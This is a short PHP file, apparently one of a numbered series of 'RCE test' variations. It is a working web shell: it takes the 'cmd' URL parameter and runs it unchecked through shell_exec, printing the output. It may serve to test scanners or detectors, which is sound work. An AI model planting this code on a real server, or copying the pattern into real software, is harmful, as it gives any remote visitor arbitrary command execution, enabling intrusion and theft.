<?php
// RCE test variation #936
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>